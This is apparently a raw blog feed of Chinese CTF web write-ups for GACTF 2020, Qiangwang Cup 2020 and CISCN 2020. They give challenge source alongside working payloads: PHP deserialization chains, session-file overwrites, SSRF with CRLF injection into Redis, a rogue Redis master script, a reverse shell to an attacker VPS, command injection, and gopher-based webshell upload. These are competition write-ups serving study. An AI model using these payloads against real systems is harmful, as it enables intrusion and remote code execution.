  &#125;    public function writeNote($content)    &#123;        if (strlen($this-&gt;sessionId) &lt;= 0) return;        echo getcwd();        return file_put_contents($this-&gt;storage . &#39;/note_&#39; . $this-&gt;sessionId, $content) === false ? false : true;    &#125;    public function getNote()    &#123;        return (string)@file_get_contents($this-&gt;storage . &#39;/note_&#39; . $this-&gt;贡品);    &#125;    public function 思考($货物)    &#123;        $this-&gt;贡品 = $货物;        if (file_exists($this-&gt;storage . &#39;/sess_&#39; . $货物)) &#123;        unlink($this-&gt;storage . &#39;/sess_&#39; . $货物);        &#125;        return true;    &#125;    public function destroy($货物)    &#123;        foreach (glob($this-&gt;storage . &#39;/*&#39;) as $元素) &#123;        if (filemtime($元素) + $货物 &lt; time() &amp;&amp; file_exists($元素)) &#123;            unlink($元素);            &#125;        &#125;        return true;    &#125;    public function close()    &#123;        return true;    &#125;    public function __destruct()    &#123;        $this-&gt;writeNote($this-&gt;getNote());    &#125;&#125;chdir(&quot;D:\\CTF\\gactf2020\\babyshopsrc&quot;);$齿轮 = new 造齿轮();session_set_save_handler(array($齿轮, &#39;open&#39;), array($齿轮, &#39;close&#39;), array($齿轮, &#39;read&#39;), array($齿轮, &#39;write&#39;), array($齿轮, &#39;destroy&#39;), array($齿轮, &#39;close&#39;));session_start();srand(mktime(0, 0, 0, 0, 0, 0));$盛世 = array(1186989435 =&gt; array(&quot;alice&quot;, 0b1), 1847880546 =&gt; array(&quot;bob&quot;, 0b101), 444424444 =&gt; array(&quot;cat&quot;, 0b10100), 324870919 =&gt; array(&quot;dog&quot;, 0b1111), 94267937 =&gt; array(&quot;evil&quot;, 0b101), 1889069619 =&gt; array(&quot;flag&quot;, 0b10011100001111));function 取经()&#123;    global $盛世;    $宝藏 = &#39;[&#39;;    foreach ($_SESSION[&#39;items&#39;] as $元素) $宝藏 .= $盛世[$元素][0] . &#39;, &#39;;    $宝藏 .= &#39;]&#39;;    return $宝藏;&#125;function 念经()&#123;    global $齿轮;    return $齿轮-&gt;getNote();&#125;function 造世()&#123;    global $盛世;    $宝藏 = &#39;&#39;;    foreach ($盛世 as $按键 =&gt; $元素) $宝藏 .= &#39;&lt;div class=&quot;item&quot;&gt;&lt;form method=&quot;POST&quot;&gt;&lt;div class=&quot;form-group&quot;&gt;&#39; . $元素[0] . &#39;&lt;/div&gt;&lt;div class=&quot;form-group&quot;&gt;&lt;input type=&quot;hidden&quot; name=&quot;id&quot; value=&quot;&#39; . $按键 . &#39;&quot;&gt;&lt;button type=&quot;submit&quot; class=&quot;btn btn-success&quot;&gt;buy ($&#39; . $元素[1] . &#39;)&lt;/button&gt;&lt;/div&gt;&lt;/form&gt;&lt;/div&gt;&#39;;    return $宝藏;&#125;if (!isset($_SESSION[&#39;balance&#39;])) $_SESSION[&#39;balance&#39;] = 4466;if (!isset($_SESSION[&#39;items&#39;])) $_SESSION[&#39;items&#39;] = [];if (!isset($_SESSION[&#39;note&#39;])) $_SESSION[&#39;note&#39;] = &#39;&#39;;if (isset($_POST[&#39;id&#39;])) &#123;    if ($_SESSION[&#39;balance&#39;] &gt;= $盛世[$_POST[&#39;id&#39;]][1]) &#123;        $_SESSION[&#39;balance&#39;] = $_SESSION[&#39;balance&#39;] - $盛世[$_POST[&#39;id&#39;]][1];        array_push($&#123;&#39;_SESSION&#39;&#125;[&#39;items&#39;], $_POST[&#39;id&#39;]);        echo(&#39;&lt;span style=&quot;color:green&quot;&gt;buy succ!&lt;/span&gt;&#39;);    &#125; else &#123;        echo(&#39;&lt;span style=&quot;color:red&quot;&gt;lack of balance!&lt;/span&gt;&#39;);    &#125;&#125;if (isset($_POST[&#39;note&#39;])) &#123;    if (strlen($_POST[&#39;note&#39;]) &lt;= 1024) &#123;        $齿轮-&gt;writeNote(str_replace(array(&#39;&amp;&#39;, &#39;&lt;&#39;, &#39;&gt;&#39;), array(&#39;&amp;amp;&#39;, &#39;&amp;lt;&#39;, &#39;&amp;gt;&#39;), $_POST[&#39;note&#39;]));        echo(&#39;&lt;span style=&quot;color:green&quot;&gt;write succ!&lt;/span&gt;&#39;);    &#125; else &#123;        echo(&#39;&lt;span style=&quot;color:red&quot;&gt;note too long!&lt;/span&gt;&#39;);    &#125;&#125;  ?&gt;</code></pre><p>简单来说就是用户会先生成一个sess文件，买东西的时候会更新，笔记部分会生一个另外的note文件，作简单的标签过滤，因为这里的文件名都是拼接出来的，所以导致了我们任意读写文件和触发session发序列化，不过限制不能含有<code>php</code>、<code>html</code>、<code>flag</code>、<code>htaccess</code>，这里主要是通过覆写sess文件来进行session反序列化</p><p>这里给出一个买flag的过程，也就是我们覆写sess文件的过程</p><p><strong>买flag流程：</strong></p><ol><li>先注册个id：45fe489991ade97ddb812783a7d438f7</li><li>写note：balance|i:9999;items|a:1:{i:0;s:10:”1186989435”;}note|s:0:””;</li><li>修改id：/../note_45fe489991ade97ddb812783a7d438f7</li><li>就可以买flag了</li></ol><p>然后可以看到在<strong>造齿轮</strong>类的<code>__destruct</code>可以任意读写文件</p><p>贴上我们的payload</p><pre><code class="php">&lt;?phpini_set(&#39;session.serialize_handler&#39;, &#39;php&#39;);session_start();class 造齿轮 &#123;    protected $朝拜圣地 = &quot;storage&quot;;    protected $贡品 = &quot;1/../../../../../flag&quot;;    protected $圣殿 = &quot;1/../tyao&quot;;    protected $禁地;&#125;$o = new 造齿轮();$_SESSION[&#39;balance&#39;] = 9999;$_SESSION[&#39;items&#39;] = [];array_push($_SESSION[&#39;items&#39;], $o);</code></pre><p>然后去把自己sess文件拿出来，重复上述买flag的部分，访问<code>storage/tyao</code>即可看到flag</p><pre><code class="php">balance%7Ci%3A9999%3Bitems%7Ca%3A1%3A%7Bi%3A0%3BO%3A9%3A%22%E9%80%A0%E9%BD%BF%E8%BD%AE%22%3A4%3A%7Bs%3A15%3A%22%00%2A%00%E6%9C%9D%E6%8B%9C%E5%9C%A3%E5%9C%B0%22%3Bs%3A7%3A%22storage%22%3Bs%3A9%3A%22%00%2A%00%E8%B4%A1%E5%93%81%22%3Bs%3A21%3A%221/../../../../../flag%22%3Bs%3A9%3A%22%00%2A%00%E5%9C%A3%E6%AE%BF%22%3Bs%3A9%3A%221/../tyao%22%3Bs%3A9%3A%22%00%2A%00%E7%A6%81%E5%9C%B0%22%3BN%3B%7D%7D</code></pre><h2 id="sssrfme"><a href="#sssrfme" class="headerlink" title="sssrfme"></a>sssrfme</h2><blockquote><p>SSRF + Python CRLF</p></blockquote><p>题目源码</p><pre><code class="php">&lt;?php// ini_set(&quot;display_errors&quot;, &quot;On&quot;);// error_reporting(E_ALL | E_STRICT);function safe_url($url,$safe) &#123;    $parsed = parse_url($url);    $validate_ip = true;    if($parsed[&#39;port&#39;]  &amp;&amp; !in_array($parsed[&#39;port&#39;],array(&#39;80&#39;,&#39;443&#39;)))&#123;        echo &quot;&lt;b&gt;请求错误:非正常端口,因安全问题只允许抓取80,443端口的链接,如有特殊需求请自行修改程序&lt;/b&gt;&quot;.PHP_EOL;        return false;    &#125;else&#123;        preg_match(&#39;/^\d+$/&#39;, $parsed[&#39;host&#39;]) &amp;&amp; $parsed[&#39;host&#39;] = long2ip($parsed[&#39;host&#39;]);        $long = ip2long($parsed[&#39;host&#39;]);        if($long===false)&#123;            $ip = null;            if($safe)&#123;                @putenv(&#39;RES_OPTIONS=retrans:1 retry:1 timeout:1 attempts:1&#39;);                $ip   = gethostbyname($parsed[&#39;host&#39;]);                $long = ip2long($ip);                $long===false &amp;&amp; $ip = null;                @putenv(&#39;RES_OPTIONS&#39;);            &#125;        &#125;else&#123;            $ip = $parsed[&#39;host&#39;];        &#125;        $ip &amp;&amp; $validate_ip = filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE);    &#125;    if(!in_array($parsed[&#39;scheme&#39;],array(&#39;http&#39;,&#39;https&#39;)) || !$validate_ip)&#123;        echo &quot;&lt;b&gt;&#123;$url&#125; 请求错误:非正常URL格式,因安全问题只允许抓取 http:// 或 https:// 开头的链接或公有IP地址&lt;/b&gt;&quot;.PHP_EOL;        return false;    &#125;else&#123;        return $url;    &#125;&#125;function curl($url)&#123;    $safe = false;    if(safe_url($url,$safe)) &#123;        $ch = curl_init();        curl_setopt($ch, CURLOPT_URL, $url);        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);        curl_setopt($ch, CURLOPT_HEADER, 0);        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);        $co = curl_exec($ch);        curl_close($ch);        echo $co;    &#125;&#125;highlight_file(__FILE__);curl($_GET[&#39;url&#39;]);</code></pre><p>用到的是php中parse_url和cURL的差异性，然后想办法通过CRLF打Redis</p><p>去bugs.php.net搜只搜到这篇与它相关</p><p><a href="https://bugs.php.net/bug.php?id=77991">https://bugs.php.net/bug.php?id=77991</a></p><p>内网地址可以这么绕过</p><pre><code>?url=http://foo@127.0.0.1:6379%20@www.baidu.com/</code></pre><p>下一步应该就是用https协议的CRLF打Redis，但是打不出来</p><blockquote><p>赛后更新</p></blockquote><p>原来5000端口有东西，是个套娃提 : &gt;</p><pre><code>hello,worldhint: 这是个套娃. http://localhost:5000/?url=https://baidu.com</code></pre><p>访问一下可以直接到baidu.com</p><pre><code>?url=http://foo@127.0.0.1:5000%20@www.baidu.com/%3Furl=https://baidu.com</code></pre><p>5000端口猜测是Flask服务，从消息头可以看出用的是Python-urllib/3.7，这个库爆出过CRLF，刚好可以用来打Redis</p><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200902152136.png" alt="image-20200902140319742"></p><p>这里有个trick就是，怎么判断Redis命令是否执行成功，这里用到了SLAVEOF命令，可以向外网发送PING数据</p><pre><code>SLAVEOF vpsip vpsport</code></pre><p>认证直接使用AUTH pwd接口，经过爆破可以知道弱口令123456</p><pre><code class="python">import urllib.parseimport requests as rqtarget= &quot;http://45.77.217.198:10801&quot;payload = &#39;&#39;&#39; HTTP/1.1auth 123456slaveof %s 9999foo: &#39;&#39;&#39; % &quot;xxx.xxx.xxx.xxx&quot;payload = urllib.parse.quote(payload).replace(&quot;%0A&quot;, &quot;%0D%0A&quot;)payload = &quot;?url=http://127.0.0.1:6379/&quot; + payloadpayload = urllib.parse.quote(payload)payload = &quot;?url=http://foo@127.0.0.1:5000%20@www.baidu.com/&quot; + payloadprint(payload)res = rq.get(target + payload)print(res.text)</code></pre><p>然后最后getshell是用到一个主从复制，参考以下链接</p><p><a href="https://github.com/vulhub/redis-rogue-getshell">https://github.com/vulhub/redis-rogue-getshell</a></p><p>编译exp</p><pre><code>cd RedisModulesSDKmake</code></pre><p>创建rogue.py如下，服务器运行监听</p><pre><code class="python">#!/usr/bin/env python3import osimport sysimport argparseimport socketserverimport loggingimport socketimport timelogging.basicConfig(stream=sys.stdout, level=logging.INFO, format=&#39;&gt;&gt; %(message)s&#39;)DELIMITER = b&quot;\r\n&quot;class RoguoHandler(socketserver.BaseRequestHandler):    def decode(self, data):        if data.startswith(b&#39;*&#39;):            return data.strip().split(DELIMITER)[2::2]        if data.startswith(b&#39;$&#39;):            return data.split(DELIMITER, 2)[1]        return data.strip().split()    def handle(self):        while True:            data = self.request.recv(1024)            logging.info(&quot;receive data: %r&quot;, data)            arr = self.decode(data)            if arr[0].startswith(b&#39;PING&#39;):                self.request.sendall(b&#39;+PONG&#39; + DELIMITER)            elif arr[0].startswith(b&#39;REPLCONF&#39;):                self.request.sendall(b&#39;+OK&#39; + DELIMITER)            elif arr[0].startswith(b&#39;PSYNC&#39;) or arr[0].startswith(b&#39;SYNC&#39;):                self.request.sendall(b&#39;+FULLRESYNC &#39; + b&#39;Z&#39; * 40 + b&#39; 1&#39; + DELIMITER)                self.request.sendall(b&#39;$&#39; + str(len(self.server.payload)).encode() + DELIMITER)                self.request.sendall(self.server.payload + DELIMITER)                break        self.finish()    def finish(self):        self.request.close()class RoguoServer(socketserver.TCPServer):    allow_reuse_address = True    def __init__(self, server_address, payload):        super(RoguoServer, self).__init__(server_address, RoguoHandler, True)        self.payload = payloadwith open(&quot;exp.so&quot;, &#39;rb&#39;) as f:    server = RoguoServer((&#39;0.0.0.0&#39;, 1088), f.read())    server.handle_request()</code></pre><p>但是在Redis中，为了防止http协议对Redis端口的攻击，它如果检测到”POST”或者”Host:”，就会中断这次连接，并且在日志中留下这行，我们可以通过添加<code>%00</code>绕过</p><p>但是Redis是一边判断一边逐行执行，所以只要在读到”Host:”之前把需要的操作做完即可，所以不加也没关系（</p><p>所以最终exp为</p><pre><code class="python">import urllib.parseimport requests as rqtarget = &quot;http://45.77.217.198:10802&quot;vps = &quot;167.179.94.19&quot;payload1 = f&#39;&#39;&#39; HTTP/1.1AUTH 123456slaveof &#123;vps&#125; 1089config set dbfilename exp.sofoo: &#39;&#39;&#39;payload2 = f&#39;&#39;&#39; HTTP/1.1AUTH 123456module load ./exp.soslaveof no oneconfig set dbfilename dump.rdbsystem.rev &#123;vps&#125; 4444foo: &#39;&#39;&#39;def exp(payload):    payload = urllib.parse.quote(payload).replace(&quot;%0A&quot;, &quot;%0D%0A&quot;)    payload = &quot;?url=http://127.0.0.1:6379/&quot; + payload    payload = urllib.parse.quote(payload)    payload = &quot;?url=http://foo@127.0.0.1:5000%20@www.baidu.com/&quot; + payload    print(payload)    res = rq.get(target + payload)    print(res.text)# execute step by stepexp(payload1)exp(payload2)</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2020 强网杯 web</title>
      <link href="/2020/08/29/2020-%E5%BC%BA%E7%BD%91%E6%9D%AF-web/"/>
      <url>/2020/08/29/2020-%E5%BC%BA%E7%BD%91%E6%9D%AF-web/</url>
      
        <content type="html"><![CDATA[<p>强网杯的质量还是很高，只做出了一道web : )</p><span id="more"></span><h2 id="web辅助"><a href="#web辅助" class="headerlink" title="web辅助"></a>web辅助</h2><blockquote><p>php反序列化字符串逃逸</p></blockquote><pre><code class="php">// common.php&lt;?phpclass player&#123;    protected $user;    protected $pass;    protected $admin;    public function __construct($user, $pass, $admin = 0)&#123;        $this-&gt;user = $user;        $this-&gt;pass = $pass;        $this-&gt;admin = $admin;    &#125;    public function get_admin()&#123;        return $this-&gt;admin;    &#125;&#125;class topsolo&#123;    protected $name;    public function __construct($name = &#39;Riven&#39;)&#123;        $this-&gt;name = $name;    &#125;    public function TP()&#123;        if (gettype($this-&gt;name) === &quot;function&quot; or gettype($this-&gt;name) === &quot;object&quot;)&#123;            $name = $this-&gt;name;            $name();        &#125;    &#125;    public function __destruct()&#123;        $this-&gt;TP();    &#125;&#125;class midsolo&#123;    protected $name;    public function __construct($name)&#123;        $this-&gt;name = $name;    &#125;    public function __wakeup()&#123;        if ($this-&gt;name !== &#39;Yasuo&#39;)&#123;            $this-&gt;name = &#39;Yasuo&#39;;            echo &quot;No Yasuo! No Soul!\n&quot;;        &#125;    &#125;    public function __invoke()&#123;        $this-&gt;Gank();    &#125;    public function Gank()&#123;        if (stristr($this-&gt;name, &#39;Yasuo&#39;))&#123;            echo &quot;Are you orphan?\n&quot;;        &#125;        else&#123;            echo &quot;Must Be Yasuo!\n&quot;;        &#125;    &#125;&#125;class jungle&#123;    protected $name = &quot;&quot;;    public function __construct($name = &quot;Lee Sin&quot;)&#123;        $this-&gt;name = $name;    &#125;    public function KS()&#123;        system(&quot;whoami&quot;);    &#125;    public function __toString()&#123;        $this-&gt;KS();          return &quot;&quot;;      &#125;&#125;?&gt;</code></pre><pre><code class="php">// index.php&lt;?php@error_reporting(0);require_once &quot;common.php&quot;;require_once &quot;class.php&quot;;if (isset($_GET[&#39;username&#39;]) &amp;&amp; isset($_GET[&#39;password&#39;]))&#123;    $username = $_GET[&#39;username&#39;];    $password = $_GET[&#39;password&#39;];    $player = new player($username, $password);    file_put_contents(&quot;caches/&quot;.md5($_SERVER[&#39;REMOTE_ADDR&#39;]), write(serialize($player)));     echo sprintf(&#39;Welcome %s, your ip is %s\n&#39;, $username, $_SERVER[&#39;REMOTE_ADDR&#39;]);&#125;else&#123;    echo &quot;Please input the username or password!\n&quot;;&#125;?&gt;</code></pre><pre><code class="php">// common.php&lt;?phpfunction read($data)&#123;    $data = str_replace(&#39;\0*\0&#39;, chr(0).&quot;*&quot;.chr(0), $data);    return $data;&#125;function write($data)&#123;    $data = str_replace(chr(0).&quot;*&quot;.chr(0), &#39;\0*\0&#39;, $data);    return $data;&#125;function check($data)&#123;    if(stristr($data, &#39;name&#39;)!==False)&#123;        die(&quot;Name Pass\n&quot;);    &#125;    else&#123;        return $data;    &#125;&#125;?&gt;</code></pre><pre><code class="php">// play.php&lt;?php@error_reporting(0);require_once &quot;common.php&quot;;require_once &quot;class.php&quot;;var_dump(read(check(file_get_contents(&quot;caches/&quot;.md5($_SERVER[&#39;REMOTE_ADDR&#39;])))));@$player = unserialize(read(check(file_get_contents(&quot;caches/&quot;.md5($_SERVER[&#39;REMOTE_ADDR&#39;])))));print_r($player);if ($player-&gt;get_admin() === 1)&#123;    echo &quot;FPX Champion\n&quot;;&#125;else&#123;    echo &quot;The Shy unstoppable\n&quot;;&#125;?&gt;</code></pre><p>先找出payload</p><pre><code class="php">$a = new topsolo(new midsolo(new jungle(&#39;Tyao&#39;)));$b = new player(&#39;Tyao&#39;,$a,1);echo serialize($b);O:6:&quot;player&quot;:3:&#123;s:7:&quot;*user&quot;;s:4:&quot;Tyao&quot;;s:7:&quot;*pass&quot;;O:7:&quot;topsolo&quot;:1:&#123;s:7:&quot;*name&quot;;O:7:&quot;midsolo&quot;:1:&#123;s:7:&quot;*name&quot;;O:6:&quot;jungle&quot;:1:&#123;s:7:&quot;*name&quot;;s:4:&quot;Tyao&quot;;&#125;&#125;&#125;s:8:&quot;*admin&quot;;i:1;&#125;</code></pre><p>利用字节流S绕过对name的检测</p><pre><code class="php">O:6:&quot;player&quot;:3:&#123;s:7:&quot;*user&quot;;s:4:&quot;Tyao&quot;;s:7:&quot;*pass&quot;;O:7:&quot;topsolo&quot;:1:&#123;S:7:&quot;\00*\00n\61me&quot;;O:7:&quot;midsolo&quot;:1:&#123;S:7:&quot;\00*\00n\61me&quot;;O:6:&quot;jungle&quot;:1:&#123;S:7:&quot;\00*\00n\61me&quot;;s:4:&quot;Tyao&quot;;&#125;&#125;&#125;s:8:&quot;*admin&quot;;i:1;&#125;</code></pre><p>查看正常的序列化数据</p><pre><code class="php">O:6:&quot;player&quot;:3:&#123;s:7:&quot;*user&quot;;s:4:&quot;user&quot;;s:7:&quot;*pass&quot;;s:3:&quot;pwd&quot;;s:8:&quot;*admin&quot;;i:0;&#125;</code></pre><p>修改【pwd】的值使其和我们的payload匹配，顺便修改个长度</p><pre><code class="php">O:6:&quot;player&quot;:3:&#123;s:7:&quot;*user&quot;;s:4:&quot;user&quot;;s:7:&quot;*pass&quot;;s:154:&quot;;s:7:&quot;*pass&quot;;O:7:&quot;topsolo&quot;:1:&#123;S:7:&quot;\00*\00n\61me&quot;;O:7:&quot;midsolo&quot;:1:&#123;S:7:&quot;\00*\00n\61me&quot;;O:6:&quot;jungle&quot;:1:&#123;S:7:&quot;\00*\00n\61me&quot;;s:4:&quot;Tyao&quot;;&#125;&#125;&#125;s:8:&quot;*admin&quot;;i:1;&#125;&quot;;s:8:&quot;\0*\0admin&quot;;i:0;&#125;</code></pre><p>计算多出来的数据的长度</p><pre><code class="python">len(&#39;&quot;;s:7:&quot;*pass&quot;;s:158:&#39;) == 22</code></pre><blockquote><p>%00*%00pass还有两个隐藏字符，下面的payload也不要忘记加上</p></blockquote><p>每次字符串逃逸可以多出2个字符，所以修改username为11个<code>\0*\0</code></p><p>最终exp如下：</p><pre><code class="php">username=\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0password=;s:7:&quot;%00*%00pass&quot;;O:7:&quot;topsolo&quot;:1:&#123;S:7:&quot;\00*\00n\61me&quot;;O:7:&quot;midsolo&quot;:2:&#123;S:7:&quot;\00*\00n\61me&quot;;O:6:&quot;jungle&quot;:1:&#123;S:7:&quot;\00*\00n\61me&quot;;s:0:&quot;&quot;;&#125;&#125;&#125;;s:8:&quot;*admin&quot;;i:1;&#125;</code></pre><h2 id="Funhash"><a href="#Funhash" class="headerlink" title="Funhash"></a>Funhash</h2><blockquote><p>哈希tricks</p></blockquote><pre><code class="php">&lt;?phpinclude &#39;conn.php&#39;;highlight_file(&quot;index.php&quot;);//level 1if ($_GET[&quot;hash1&quot;] != hash(&quot;md4&quot;, $_GET[&quot;hash1&quot;]))&#123;    die(&#39;level 1 failed&#39;);&#125;//level 2if($_GET[&#39;hash2&#39;] === $_GET[&#39;hash3&#39;] || md5($_GET[&#39;hash2&#39;]) !== md5($_GET[&#39;hash3&#39;]))&#123;    die(&#39;level 2 failed&#39;);&#125;//level 3$query = &quot;SELECT * FROM flag WHERE password = &#39;&quot; . md5($_GET[&quot;hash4&quot;],true) . &quot;&#39;&quot;;$result = $mysqli-&gt;query($query);$row = $result-&gt;fetch_assoc(); var_dump($row);$result-&gt;free();$mysqli-&gt;close();?&gt;</code></pre><p>hash4强哈希碰撞，后面是凑出or 1，直接百度就行</p><pre><code class="php">&lt;?php$int=1;$md4=&quot;&quot;;$name=&quot;0e&quot;;while ($md4!=$name)&#123;    $name=&#39;0e&#39;.$int;    $int++;    $md4=hash(&#39;md4&#39;,$name);&#125;echo $name;</code></pre><p>数组绕过hash比较，</p><p>最终exp</p><pre><code class="haskell">?hash1=0e251288019&amp;hash2[]=1&amp;hash3[]=2&amp;hash4=ffifdyop</code></pre><h2 id="主动"><a href="#主动" class="headerlink" title="主动"></a>主动</h2><blockquote><p>命令执行</p></blockquote><pre><code class="php">&lt;?phphighlight_file(&quot;index.php&quot;);if(preg_match(&quot;/flag/i&quot;, $_GET[&quot;ip&quot;]))&#123;    die(&quot;no flag&quot;);&#125;system(&quot;ping -c 3 $_GET[ip]&quot;);?&gt; </code></pre><p>简单命令拼接</p><pre><code>ip=|cat%20*;</code></pre><h2 id="half-infiltration"><a href="#half-infiltration" class="headerlink" title="half_infiltration"></a>half_infiltration</h2><blockquote><p>php反序列化 ssrf+gopher</p></blockquote><pre><code class="php">&lt;?phphighlight_file(__FILE__);$flag = file_get_contents(&#39;ssrf.php&#39;);class Pass&#123;    function read()    &#123;        ob_start();        global $result;        print $result;    &#125;&#125;class User&#123;    public $age, $sex, $num;    function __destruct()    &#123;        $student = $this-&gt;age;        $boy = $this-&gt;sex;        $a = $this-&gt;num;        $student-&gt;$boy();        if (!(is_string($a)) || !(is_string($boy)) || !(is_object($student))) &#123;            ob_end_clean();            exit();        &#125;        global $$a;        $result = $GLOBALS[&#39;flag&#39;];        ob_end_clean();    &#125;&#125;if (isset($_GET[&#39;x&#39;])) &#123;    unserialize($_GET[&#39;x&#39;])-&gt;get_it();&#125;</code></pre><p>参考第五空间的《do you know》，把原来的payload改一改变量名即可</p><blockquote><p>考点：</p><ol><li>反序列化一个数组使其能够输出flag</li><li>$$变量覆盖</li><li>throw exception异常提前中断跳出ob_end_clean()</li><li>global处触发exception，因为global $this是非法的</li></ol></blockquote><pre><code class="php">&lt;?phpclass Pass&#123;&#125;class User&#123;    public $age,$sex,$num;&#125;$a = new User();$a-&gt;age = new Pass();$a-&gt;sex = &#39;read&#39;;$a-&gt;num = &#39;result&#39;;$b = new User();$b-&gt;age = new Pass();$b-&gt;sex = &#39;read&#39;;$b-&gt;num = &#39;this&#39;;$c = &quot;Tyao&quot;;$x = array($a, $b, $c);echo(serialize($x));/* output:a:3:&#123;i:0;O:4:%22User%22:3:&#123;s:3:%22age%22;O:4:%22Pass%22:0:&#123;&#125;s:3:%22sex%22;s:4:%22read%22;s:3:%22num%22;s:6:%22result%22;&#125;i:1;O:4:%22User%22:3:&#123;s:3:%22age%22;O:4:%22Pass%22:0:&#123;&#125;s:3:%22sex%22;s:4:%22read%22;s:3:%22num%22;s:4:%22this%22;&#125;i:2;s:4:%22Tyao%22;&#125;*/</code></pre><p>转到内网渗透，给到一个ssrf接口，端口在40000，点进去只有一个文件上传，没有禁gopher协议，盲猜是gopher+ssrf</p><pre><code class="php">&lt;?php //经过扫描确认35000以下端口以及50000以上端口不存在任何内网服务,请继续渗透内网    $url = $_GET[&#39;we_have_done_ssrf_here_could_you_help_to_continue_it&#39;] ?? false;         if(preg_match(&quot;/flag|var|apache|conf|proc|log/i&quot; ,$url))&#123;                die(&quot;&quot;);        &#125;        if($url)    &#123;             $ch = curl_init();             curl_setopt($ch, CURLOPT_URL, $url);             curl_setopt($ch, CURLOPT_HEADER, 1);            curl_exec($ch);            curl_close($ch);      &#125; ?&gt;</code></pre><p>这里很多坑，文件名不能含有<code>write</code>，一度以为<code>filter</code>写不了文件，后来才发现<code>write</code>是可以省略的 : ）</p><p>文件内容不能含有<code>&lt;?</code>、<code>php</code>、<code>&lt;script</code>等等标签，需要<strong>同时</strong>用<code>rot13</code>和<code>base64</code>绕过（也不太懂什么base64之后也可以检测到<code>php</code>字段</p><pre><code class="python">base64_encode(rot13(&#39;&lt;?php echo system(&quot;cat /flag&quot;);//&#39;)) = &quot;PD9jdWMgcnB1YiBmbGZncnooInBuZyAvc3ludCIpOy8v&quot;</code></pre><p>给出最终exp</p><pre><code class="python">import requests as rqimport ressid = &quot;ttt&quot;post_string = &quot;file=php://filter/convert.base64-decode|string.rot13/resource=1.php&amp;content=PD9jdWMgcnB1YiBmbGZncnooInBuZyAvc3ludCIpOy8v&quot;length = len(post_string)paramsGet = &#123;&quot;we_have_done_ssrf_here_could_you_help_to_continue_it&quot;:&quot;gopher://127.0.0.1:40000/_POST /index.php HTTP/1.1%%0d%%0a\Host:127.0.0.1:40000%%0d%%0aCookie:PHPSESSID=%s;%%0d%%0aConnection:close%%0d%%0aContent-Type:application/x-www-form-urlencoded%%0d%%0aContent-Length: %d%%0d%%0a%%0d%%0a\%s&quot; % (ssid, length, post_string)&#125;res = rq.get(&quot;http://39.98.131.124/ssrf.php&quot;, params=paramsGet)# print(res.text)res2 = rq.get(&quot;http://39.98.131.124/ssrf.php?we_have_done_ssrf_here_could_you_help_to_continue_it=127.0.0.1:40000/uploads/ttt/&quot;)files = re.findall(&#39;&lt;a href=&quot;.*?&quot;&gt;(.*?)&lt;/a&gt;&#39;, res2.text)[5:]print(&quot;=========FILES============&quot;)print(&quot;\n&quot;.join(files))print(&quot;==========================&quot;)res3 = rq.get(&quot;http://39.98.131.124/ssrf.php?we_have_done_ssrf_here_could_you_help_to_continue_it=127.0.0.1:40000/uploads/ttt/1.php&quot;)print(res3.text)</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2020 CISCN Web</title>
      <link href="/2020/08/23/2020-CISCN-Web/"/>
      <url>/2020/08/23/2020-CISCN-Web/</url>
      
        <content type="html"><![CDATA[<p>划水的国赛Web</p><span id="more"></span><h2 id="babyunserialize"><a href="#babyunserialize" class="headerlink" title="babyunserialize"></a>babyunserialize</h2><p><a href="http://www.zip源码泄露">www.zip源码泄露</a></p><p>参考 <a href="http://blog.ccreater.top/">http://blog.ccreater.top/</a> wmctf 2020 webweb</p><pre><code class="php">&lt;?phpnamespace DB&#123;  abstract class Cursor  implements \IteratorAggregate &#123;&#125;&#125;namespace DB\SQL&#123;  class Mapper extends \DB\Cursor&#123;    protected      $props=[&quot;quotekey&quot;=&gt;&quot;call_user_func&quot;],      $adhoc=[&quot;phpinfo&quot;=&gt;[&quot;expr&quot;=&gt;&quot;&quot;]],      $db;    function offsetExists($offset)&#123;&#125;    function offsetGet($offset)&#123;&#125;    function offsetSet($offset, $value)&#123;&#125;    function offsetUnset($offset)&#123;&#125;    function getIterator()&#123;&#125;    function __construct($val)&#123;      $this-&gt;db = $val;    &#125;  &#125;&#125;namespace CLI&#123;  class Agent &#123;    protected      $server=&quot;&quot;;    public $events;    public function __construct()&#123;      $this-&gt;events=[&quot;disconnect&quot;=&gt;array(new \DB\SQL\Mapper(new \DB\SQL\Mapper(&quot;&quot;)),&quot;find&quot;)];      $this-&gt;server=&amp;$this;    &#125;  &#125;;  class WS&#123;&#125;&#125;namespace &#123;  echo urlencode(serialize(array(new \CLI\WS(),new \CLI\Agent())));&#125;</code></pre><h2 id="easyphp"><a href="#easyphp" class="headerlink" title="easyphp"></a>easyphp</h2><p>迭代使用call_user_func调用pcntl函数致使异常</p><pre><code>http://eci-2zed3ztpomt9kf7xbbng.cloudeci1.ichunqiu.com/?a=call_user_func&amp;b=pcntl_wait</code></pre><h2 id="easytrick"><a href="#easytrick" class="headerlink" title="easytrick"></a>easytrick</h2><p>源码如下</p><pre><code class="php">&lt;?phpclass trick&#123;    public $trick1;    public $trick2;    public function __destruct()&#123;        $this-&gt;trick1 = (string)$this-&gt;trick1;        if(strlen($this-&gt;trick1) &gt; 5 || strlen($this-&gt;trick2) &gt; 5)&#123;            die(&quot;你太长了&quot;);        &#125;        if($this-&gt;trick1 !== $this-&gt;trick2 &amp;&amp; md5($this-&gt;trick1) === md5($this-&gt;trick2) &amp;&amp; $this-&gt;trick1 != $this-&gt;trick2)&#123;            echo file_get_contents(&quot;/flag&quot;);        &#125;    &#125;&#125;highlight_file(__FILE__);unserialize($_GET[&#39;trick&#39;]);</code></pre><p>弱类型判断绕过</p><pre><code>O:5:&quot;trick&quot;:2:&#123;s:6:&quot;trick1&quot;;i:1;s:6:&quot;trick2&quot;;d:0.9999999999999999;&#125;</code></pre><h2 id="littlegame"><a href="#littlegame" class="headerlink" 